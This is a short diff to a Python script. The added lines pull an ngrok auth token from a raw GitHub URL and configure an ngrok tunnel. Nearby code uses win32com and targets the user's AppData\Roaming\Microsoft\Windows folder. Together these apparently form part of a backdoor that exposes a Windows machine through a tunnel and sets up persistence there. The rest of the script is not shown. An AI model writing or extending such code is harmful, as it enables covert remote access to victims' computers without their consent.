@@ -38,6 +38,11 @@ time.sleep(3)
 
 import requests
 import win32com.client
+from pyngrok import ngrok
+
+r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/ngrok.txt")
+ngtok = r.text
+ngrok.set_auth_token(str(ngtok))
 
 user_profile = os.environ['USERPROFILE']
 target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
